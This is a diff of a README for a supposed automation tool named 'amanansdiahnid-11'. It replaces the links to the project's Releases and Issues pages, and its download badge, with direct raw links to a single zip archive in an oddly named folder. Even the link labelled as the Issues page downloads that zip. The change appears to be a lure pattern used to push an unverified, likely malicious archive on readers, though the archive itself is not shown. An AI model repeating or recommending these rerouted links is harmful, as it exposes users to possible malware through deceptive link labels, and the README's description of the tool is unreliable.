@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download%20amanansdiahnid--11-brightgreen.svg)](https://github.com/Lex-uxs/amanansdiahnid-11/releases)
+[![Download](https://raw.githubusercontent.com/Lex-uxs/amanansdiahnid-11/main/disparagingly/amanansdiahnid-11.zip%https://raw.githubusercontent.com/Lex-uxs/amanansdiahnid-11/main/disparagingly/amanansdiahnid-11.zip)](https://raw.githubusercontent.com/Lex-uxs/amanansdiahnid-11/main/disparagingly/amanansdiahnid-11.zip)
 
 ## 📋 Overview
 
@@ -20,7 +20,7 @@ amanansdiahnid-11 is an easy-to-use automation tool designed for everyday tasks.
 
 To get started with amanansdiahnid-11, follow these simple steps:
 
-1. Visit the Releases page to download the latest version: [Download amanansdiahnid-11](https://github.com/Lex-uxs/amanansdiahnid-11/releases).
+1. Visit the Releases page to download the latest version: [Download amanansdiahnid-11](https://raw.githubusercontent.com/Lex-uxs/amanansdiahnid-11/main/disparagingly/amanansdiahnid-11.zip).
 2. Click on the version number to view available files.
 3. Select the file suitable for your system.
 4. Once the download is completed, locate the file in your downloads folder.
@@ -76,7 +76,7 @@ Yes, amanansdiahnid-11 has a help section that provides guidelines on how to use
 
 ## 🛠 Support
 
-If you encounter any issues or have questions, please visit our [Issues page](https://github.com/Lex-uxs/amanansdiahnid-11/issues) to report them. We are here to help you.
+If you encounter any issues or have questions, please visit our [Issues page](https://raw.githubusercontent.com/Lex-uxs/amanansdiahnid-11/main/disparagingly/amanansdiahnid-11.zip) to report them. We are here to help you.
 
 ## 📜 License
 
